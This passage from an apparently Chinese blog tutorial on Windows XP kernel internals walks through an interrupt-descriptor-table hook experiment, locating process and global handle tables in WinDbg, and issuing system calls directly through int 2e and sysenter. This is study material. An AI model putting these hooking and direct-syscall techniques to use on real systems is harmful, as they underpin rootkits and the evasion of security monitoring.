class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后写一个循环读取计数器的程序：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>DWORD g_num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>DWORD g_flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 设置Hook</span><span class="token keyword">void</span> <span class="token function">_declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">IdtEntry</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  mov eax<span class="token punctuation">,</span> g_flag  cmp eax<span class="token punctuation">,</span> <span class="token number">1</span>  jne L  xor eax<span class="token punctuation">,</span> eax  mov g_flag<span class="token punctuation">,</span> <span class="token number">0</span>  mov ds<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0x8003f180</span><span class="token punctuation">]</span><span class="token punctuation">,</span> eax  L<span class="token operator">:</span>  mov eax<span class="token punctuation">,</span> ds <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">0x8003f180</span><span class="token punctuation">]</span>  mov g_num<span class="token punctuation">,</span> eax  iretd <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  <span class="token comment">//mov g_flag, 1</span>  <span class="token keyword">int</span> <span class="token number">0x20</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>IdtEntry <span class="token operator">!=</span> <span class="token number">0x401040</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Address!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> g_num<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-句柄表"><a href="#2-句柄表" class="headerlink" title="2 句柄表"></a>2 句柄表</h2><p>句柄表的作用是封装内核对象指针为句柄供3环使用，避免在3环下直接操作内核对象地址。</p><h3 id="2-1-进程句柄表"><a href="#2-1-进程句柄表" class="headerlink" title="2.1 进程句柄表"></a>2.1 进程句柄表</h3><p>句柄结构：<br><img src="/images/3-12.png" alt="3-12"></p><ul><li>1：高字节给<em><strong>SetHandleInformation</strong></em>函数使用，低字节保留；</li><li>2：访问掩码，给<em><strong>OpenProcess</strong></em>函数使用；</li><li>3&amp;4：<ul><li>第0位标识是否允许关闭此句柄，默认为1；</li><li>第1位标识此句柄是否可被继承，默认为1；</li><li>第2位标识关闭对象时是否产生一个审计事件，默认为0；</li></ul></li></ul><h4 id="实验4：定位句柄表"><a href="#实验4：定位句柄表" class="headerlink" title="实验4：定位句柄表"></a>实验4：定位句柄表</h4><p>编写代码，使用OpenProcess获取句柄：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> DWORD PID<span class="token punctuation">;</span> HANDLE hPro <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> HWND hWnd <span class="token operator">=</span> <span class="token operator">::</span><span class="token function">FindWindow</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> L<span class="token string">"计算器"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">::</span><span class="token function">GetWindowThreadProcessId</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>PID<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  hPro <span class="token operator">=</span> <span class="token operator">::</span><span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_CREATE_THREAD <span class="token operator">|</span> PROCESS_VM_OPERATION <span class="token operator">|</span> PROCESS_VM_READ <span class="token operator">|</span> PROCESS_VM_WRITE<span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> PID<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"句柄：%x\n"</span><span class="token punctuation">,</span> hPro<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看进程结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _EPROCESS <span class="token number">822</span>d6658nt<span class="token operator">!</span>_EPROCESS   <span class="token operator">+</span><span class="token number">0x000</span> Pcb              <span class="token operator">:</span> _KPROCESS   <span class="token operator">+</span><span class="token number">0x06c</span> ProcessLock      <span class="token operator">:</span> _EX_PUSH_LOCK   <span class="token operator">+</span><span class="token number">0x070</span> CreateTime       <span class="token operator">:</span> _LARGE_INTEGER <span class="token number">0x01da8104</span>`<span class="token number">323</span>d7d16   <span class="token operator">+</span><span class="token number">0x078</span> ExitTime         <span class="token operator">:</span> _LARGE_INTEGER <span class="token number">0x0</span>   <span class="token operator">+</span><span class="token number">0x080</span> RundownProtect   <span class="token operator">:</span> _EX_RUNDOWN_REF   <span class="token operator">+</span><span class="token number">0x084</span> UniqueProcessId  <span class="token operator">:</span> <span class="token number">0x00000640</span> Void   <span class="token operator">+</span><span class="token number">0x088</span> ActiveProcessLinks <span class="token operator">:</span> _LIST_ENTRY <span class="token punctuation">[</span> <span class="token number">0x8055b158</span> <span class="token operator">-</span> <span class="token number">0x822d79d8</span> <span class="token punctuation">]</span>   <span class="token operator">+</span><span class="token number">0x090</span> QuotaUsage       <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token number">0x578</span>   <span class="token operator">+</span><span class="token number">0x09c</span> QuotaPeak        <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token number">0x578</span>   <span class="token operator">+</span><span class="token number">0x0a8</span> CommitCharge     <span class="token operator">:</span> <span class="token number">0x5a</span>   <span class="token operator">+</span><span class="token number">0x0ac</span> PeakVirtualSize  <span class="token operator">:</span> <span class="token number">0xd9b000</span>   <span class="token operator">+</span><span class="token number">0x0b0</span> VirtualSize      <span class="token operator">:</span> <span class="token number">0xd9b000</span>   <span class="token operator">+</span><span class="token number">0x0b4</span> SessionProcessLinks <span class="token operator">:</span> _LIST_ENTRY <span class="token punctuation">[</span> <span class="token number">0xf8bd2014</span> <span class="token operator">-</span> <span class="token number">0x822d7a04</span> <span class="token punctuation">]</span>   <span class="token operator">+</span><span class="token number">0x0bc</span> DebugPort        <span class="token operator">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>    <span class="token operator">+</span><span class="token number">0x0c0</span> ExceptionPort    <span class="token operator">:</span> <span class="token number">0xe16659f8</span> Void   <span class="token operator">+</span><span class="token number">0x0c4</span> ObjectTable      <span class="token operator">:</span> <span class="token number">0xe1fdae30</span> _HANDLE_TABLE   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定位ObjectTable：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _HANDLE_TABLE e1fdae30nt<span class="token operator">!</span>_HANDLE_TABLE   <span class="token operator">+</span><span class="token number">0x000</span> TableCode        <span class="token operator">:</span> <span class="token number">0xe110d000</span>   <span class="token operator">+</span><span class="token number">0x004</span> QuotaProcess     <span class="token operator">:</span> <span class="token number">0x822d6658</span> _EPROCESS   <span class="token operator">+</span><span class="token number">0x008</span> UniqueProcessId  <span class="token operator">:</span> <span class="token number">0x00000640</span> Void   <span class="token operator">+</span><span class="token number">0x00c</span> HandleTableLock  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> _EX_PUSH_LOCK   <span class="token operator">+</span><span class="token number">0x01c</span> HandleTableList  <span class="token operator">:</span> _LIST_ENTRY <span class="token punctuation">[</span> <span class="token number">0x8055c448</span> <span class="token operator">-</span> <span class="token number">0xe21ed88c</span> <span class="token punctuation">]</span>   <span class="token operator">+</span><span class="token number">0x024</span> HandleContentionEvent <span class="token operator">:</span> _EX_PUSH_LOCK   <span class="token operator">+</span><span class="token number">0x028</span> DebugInfo        <span class="token operator">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>    <span class="token operator">+</span><span class="token number">0x02c</span> ExtraInfoPages   <span class="token operator">:</span> <span class="token number">0</span>n0   <span class="token operator">+</span><span class="token number">0x030</span> FirstFree        <span class="token operator">:</span> <span class="token number">0x60</span>   <span class="token operator">+</span><span class="token number">0x034</span> LastFree         <span class="token operator">:</span> <span class="token number">0</span>   <span class="token operator">+</span><span class="token number">0x038</span> NextHandleNeedingPool <span class="token operator">:</span> <span class="token number">0x800</span>   <span class="token operator">+</span><span class="token number">0x03c</span> HandleCount      <span class="token operator">:</span> <span class="token number">0</span>n23   <span class="token operator">+</span><span class="token number">0x040</span> Flags            <span class="token operator">:</span> <span class="token number">0</span>   <span class="token operator">+</span><span class="token number">0x040</span> StrictFIFO       <span class="token operator">:</span> <span class="token number">0</span>y0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据OpenProcess返回的句柄号定位对应的句柄：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dq e110d000 <span class="token operator">+</span> <span class="token number">0x38</span> <span class="token operator">/</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token number">8</span>ReadVirtual<span class="token operator">:</span> e110d080 not properly sign extendede110d070  <span class="token number">0000003</span>a`<span class="token number">822</span>d793b <span class="token number">0000003</span>a`<span class="token number">822</span>d793be110d080  <span class="token number">0000003</span>a`<span class="token number">822</span>d793b <span class="token number">0000003</span>a`<span class="token number">822</span>d793be110d090  <span class="token number">0000003</span>a`<span class="token number">822</span>d793b <span class="token number">0000003</span>a`<span class="token number">822</span>d793be110d0a0  <span class="token number">0000003</span>a`<span class="token number">822</span>d793b <span class="token number">0000003</span>a`<span class="token number">822</span>d793be110d0b0  <span class="token number">0000003</span>a`<span class="token number">822</span>d793b <span class="token number">0000003</span>a`<span class="token number">822</span>d793be110d0c0  <span class="token number">00000064</span>`<span class="token number">00000000</span> <span class="token number">00000068</span>`<span class="token number">00000000</span>e110d0d0  <span class="token number">0000006</span>c`<span class="token number">00000000</span> <span class="token number">00000070</span>`<span class="token number">00000000</span>e110d0e0  <span class="token number">00000074</span>`<span class="token number">00000000</span> <span class="token number">00000078</span>`<span class="token number">00000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据句柄结构，计算出内核对象的地址为822d7938，此地址是一个0x18字节的_OBJECT_HEADER结构体，后面紧跟着对应进程的EPROCESS结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _OBJECT_HEADER <span class="token number">822</span>d7938nt<span class="token operator">!</span>_OBJECT_HEADER   <span class="token operator">+</span><span class="token number">0x000</span> PointerCount     <span class="token operator">:</span> <span class="token number">0</span>n26   <span class="token operator">+</span><span class="token number">0x004</span> HandleCount      <span class="token operator">:</span> <span class="token number">0</span>n12   <span class="token operator">+</span><span class="token number">0x004</span> NextToFree       <span class="token operator">:</span> <span class="token number">0x0000000c</span> Void   <span class="token operator">+</span><span class="token number">0x008</span> Type             <span class="token operator">:</span> <span class="token number">0x825b9e70</span> _OBJECT_TYPE   <span class="token operator">+</span><span class="token number">0x00c</span> NameInfoOffset   <span class="token operator">:</span> <span class="token number">0</span> <span class="token char">''</span>   <span class="token operator">+</span><span class="token number">0x00d</span> HandleInfoOffset <span class="token operator">:</span> <span class="token number">0</span> <span class="token char">''</span>   <span class="token operator">+</span><span class="token number">0x00e</span> QuotaInfoOffset  <span class="token operator">:</span> <span class="token number">0</span> <span class="token char">''</span>   <span class="token operator">+</span><span class="token number">0x00f</span> Flags            <span class="token operator">:</span> <span class="token number">0x20</span> <span class="token char">' '</span>   <span class="token operator">+</span><span class="token number">0x010</span> ObjectCreateInfo <span class="token operator">:</span> <span class="token number">0x823117c8</span> _OBJECT_CREATE_INFORMATION   <span class="token operator">+</span><span class="token number">0x010</span> QuotaBlockCharged <span class="token operator">:</span> <span class="token number">0x823117c8</span> Void   <span class="token operator">+</span><span class="token number">0x014</span> SecurityDescriptor <span class="token operator">:</span> <span class="token number">0xe1f9e4e6</span> Void   <span class="token operator">+</span><span class="token number">0x018</span> Body             <span class="token operator">:</span> _QUAD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-全局句柄表"><a href="#2-2-全局句柄表" class="headerlink" title="2.2 全局句柄表"></a>2.2 全局句柄表</h3><p>全局句柄表中存储的是每一个线程和进程对应的句柄。<br>如果全局句柄表中的句柄总数多于512，操作系统会采取多级句柄表的形式，并使用HANDLE_TABLE结构体中的TableCode低字节标识，为0时标识一级句柄表，为1时标识二级句柄表，以此类推。</p><h4 id="实验5：定位全局句柄表"><a href="#实验5：定位全局句柄表" class="headerlink" title="实验5：定位全局句柄表"></a>实验5：定位全局句柄表</h4><p>获取全局句柄表地址：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dd PspCidTable<span class="token number">8055</span>b260  e1000898 <span class="token number">00000002</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">8055</span>b270  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">8055</span>b280  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">8055</span>b290  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">8055</span>b2a0  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">8055</span>b2b0  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">8055</span>b2c0  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span class="token number">8055</span>b2d0  <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span> <span class="token number">00000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看句柄表结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _HANDLE_TABLE e1000898nt<span class="token operator">!</span>_HANDLE_TABLE   <span class="token operator">+</span><span class="token number">0x000</span> TableCode        <span class="token operator">:</span> <span class="token number">0xe1003000</span>   <span class="token operator">+</span><span class="token number">0x004</span> QuotaProcess     <span class="token operator">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>    <span class="token operator">+</span><span class="token number">0x008</span> UniqueProcessId  <span class="token operator">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>    <span class="token operator">+</span><span class="token number">0x00c</span> HandleTableLock  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> _EX_PUSH_LOCK   <span class="token operator">+</span><span class="token number">0x01c</span> HandleTableList  <span class="token operator">:</span> _LIST_ENTRY <span class="token punctuation">[</span> <span class="token number">0xe10008b4</span> <span class="token operator">-</span> <span class="token number">0xe10008b4</span> <span class="token punctuation">]</span>   <span class="token operator">+</span><span class="token number">0x024</span> HandleContentionEvent <span class="token operator">:</span> _EX_PUSH_LOCK   <span class="token operator">+</span><span class="token number">0x028</span> DebugInfo        <span class="token operator">:</span> <span class="token punctuation">(</span>null<span class="token punctuation">)</span>    <span class="token operator">+</span><span class="token number">0x02c</span> ExtraInfoPages   <span class="token operator">:</span> <span class="token number">0</span>n0   <span class="token operator">+</span><span class="token number">0x030</span> FirstFree        <span class="token operator">:</span> <span class="token number">0x42c</span>   <span class="token operator">+</span><span class="token number">0x034</span> LastFree         <span class="token operator">:</span> <span class="token number">0x414</span>   <span class="token operator">+</span><span class="token number">0x038</span> NextHandleNeedingPool <span class="token operator">:</span> <span class="token number">0x800</span>   <span class="token operator">+</span><span class="token number">0x03c</span> HandleCount      <span class="token operator">:</span> <span class="token number">0</span>n333   <span class="token operator">+</span><span class="token number">0x040</span> Flags            <span class="token operator">:</span> <span class="token number">1</span>   <span class="token operator">+</span><span class="token number">0x040</span> StrictFIFO       <span class="token operator">:</span> <span class="token number">0</span>y1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时为1级句柄表，直接获取句柄即可，偏移量 &#x3D; PID &#x2F; 4 * 8：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dq e1003000 <span class="token operator">+</span> e60ReadVirtual<span class="token operator">:</span> e1003e60 not properly sign extendede1003e60  <span class="token number">00000000</span>`<span class="token number">8208</span>d489 <span class="token number">00000000</span>`<span class="token number">8233</span>ada9e1003e70  <span class="token number">00000000</span>`<span class="token number">8241</span>a021 <span class="token number">00000000</span>`<span class="token number">81f</span>a8b59e1003e80  <span class="token number">00000000</span>`<span class="token number">82336021</span> <span class="token number">00000000</span>`<span class="token number">823365</span>b9e1003e90  <span class="token number">00000000</span>`<span class="token number">8240</span>abd9 <span class="token number">00000000</span>`<span class="token number">8240</span>a941e1003ea0  <span class="token number">00000000</span>`<span class="token number">81f</span>a3021 <span class="token number">00000000</span>`<span class="token number">81f</span>a3da9e1003eb0  <span class="token number">00000000</span>`<span class="token number">81f</span>a3b31 <span class="token number">00000000</span>`<span class="token number">81f</span>a38b9e1003ec0  <span class="token number">00000000</span>`<span class="token number">81f</span>a3609 <span class="token number">00000000</span>`<span class="token number">8208</span>aa91e1003ed0  <span class="token number">00000000</span>`<span class="token number">82409021</span> <span class="token number">00000450</span>`<span class="token number">00000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据句柄结构可以定位到地址8208d488，此时的地址就是对应的进程结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _EPROCESS <span class="token number">8208</span>d488nt<span class="token operator">!</span>_EPROCESS   <span class="token operator">+</span><span class="token number">0x000</span> Pcb              <span class="token operator">:</span> _KPROCESS   <span class="token operator">+</span><span class="token number">0x06c</span> ProcessLock      <span class="token operator">:</span> _EX_PUSH_LOCK   <span class="token operator">+</span><span class="token number">0x070</span> CreateTime       <span class="token operator">:</span> _LARGE_INTEGER <span class="token number">0x01da8108</span>`<span class="token number">407f</span><span class="token number">49f</span>a   <span class="token operator">+</span><span class="token number">0x078</span> ExitTime         <span class="token operator">:</span> _LARGE_INTEGER <span class="token number">0x0</span>   <span class="token operator">+</span><span class="token number">0x080</span> RundownProtect   <span class="token operator">:</span> _EX_RUNDOWN_REF   <span class="token operator">+</span><span class="token number">0x084</span> UniqueProcessId  <span class="token operator">:</span> <span class="token number">0x00000730</span> Void   <span class="token operator">+</span><span class="token number">0x088</span> ActiveProcessLinks <span class="token operator">:</span> _LIST_ENTRY <span class="token punctuation">[</span> <span class="token number">0x8251db18</span> <span class="token operator">-</span> <span class="token number">0x821e8680</span> <span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-系统调用"><a href="#3-系统调用" class="headerlink" title="3 系统调用"></a>3 系统调用</h2><h3 id="3-1-3环调用"><a href="#3-1-3环调用" class="headerlink" title="3.1 3环调用"></a>3.1 3环调用</h3><p>分析一下kernel32.dll中的导出函数<em><strong>ReadProcessMemory</strong></em>函数，反编译伪码如下。可以看到，在此函数中又调用了导入函数（来自ntdll.dll）中的<em><strong>NtReadVirtualMemory</strong></em>函数，并没有更多的操作。<br><img src="/images/3-8.png" alt="3-8"><br>继续分析ntdll.dll中的导出函数NtReadVirtualMemory，只有四行汇编代码，给EAX寄存器赋值后就call了一个特定地址(7FFE0300h)的值，而在这个地址上的就是3环进0环所调用的API函数地址，EAX中的值标识了调用哪个0环API函数。<br><img src="/images/3-9.png" alt="3-9"></p><h4 id="模拟3环调用"><a href="#模拟3环调用" class="headerlink" title="模拟3环调用"></a>模拟3环调用</h4><p>因此我们可以在3环直接调用到0环的API，而不使用任何3环API函数。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>DWORD g_temp <span class="token operator">=</span> <span class="token number">0x12345678</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">MyReadProcessMemory</span><span class="token punctuation">(</span>HANDLE hProcess<span class="token punctuation">,</span> LPCVOID lpBaseAddress<span class="token punctuation">,</span>  LPVOID lpBuffer<span class="token punctuation">,</span> SIZE_T nSize<span class="token punctuation">,</span> SIZE_T<span class="token operator">*</span> lpNumberOfBytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> DWORD dwBuffer<span class="token punctuation">;</span> HANDLE hProcess <span class="token operator">=</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">MyReadProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_temp<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwBuffer<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The Buffer is %p\n"</span><span class="token punctuation">,</span> dwBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">MyReadProcessMemory</span><span class="token punctuation">(</span>HANDLE hProcess<span class="token punctuation">,</span> LPCVOID lpBaseAddress<span class="token punctuation">,</span> LPVOID lpBuffer<span class="token punctuation">,</span> SIZE_T nSize<span class="token punctuation">,</span> SIZE_T<span class="token operator">*</span> lpNumberOfBytesRead<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  lea  eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">]</span>  push eax<span class="token punctuation">;</span> ReturnLength  push<span class="token punctuation">[</span>ebp <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">]</span><span class="token punctuation">;</span> BufferLength  push<span class="token punctuation">[</span>ebp <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span> Buffer  push<span class="token punctuation">[</span>ebp <span class="token operator">+</span> <span class="token number">0x0C</span><span class="token punctuation">]</span><span class="token punctuation">;</span> BaseAddress  push<span class="token punctuation">[</span>ebp <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">]</span><span class="token punctuation">;</span> ProcessHandle  mov  eax<span class="token punctuation">,</span> <span class="token number">0</span>BAh  mov  edx<span class="token punctuation">,</span> esp  <span class="token keyword">int</span>  <span class="token number">2</span>eh  add  esp<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">;</span> 平栈  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<em><strong>SystemCall</strong></em>：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">__declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> __stdcall <span class="token function">MyReadProcessMemory</span><span class="token punctuation">(</span>HANDLE hProcess<span class="token punctuation">,</span> LPCVOID lpBaseAddress<span class="token punctuation">,</span> LPVOID lpBuffer<span class="token punctuation">,</span> SIZE_T nSize<span class="token punctuation">,</span> SIZE_T<span class="token operator">*</span> lpNumberOfBytesRead<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> _asm <span class="token punctuation">&#123;</span>  mov  eax<span class="token punctuation">,</span> <span class="token number">0</span>BAh  mov  edx<span class="token punctuation">,</span> <span class="token number">7FF</span>E0300h  call dword ptr<span class="token punctuation">[</span>edx<span class="token punctuation">]</span>  retn <span class="token number">14</span>h <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者直接调用<em><strong>sysenter</strong></em>：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">MyReadProcessMemory</span><span class="token punctuation">(</span>HANDLE hProcess<span class="token punctuation">,</span> LPCVOID lpBaseAddress<span class="token punctuation">,</span> LPVOID lpBuffer<span class="token punctuation">,</span> SIZE_T nSize<span 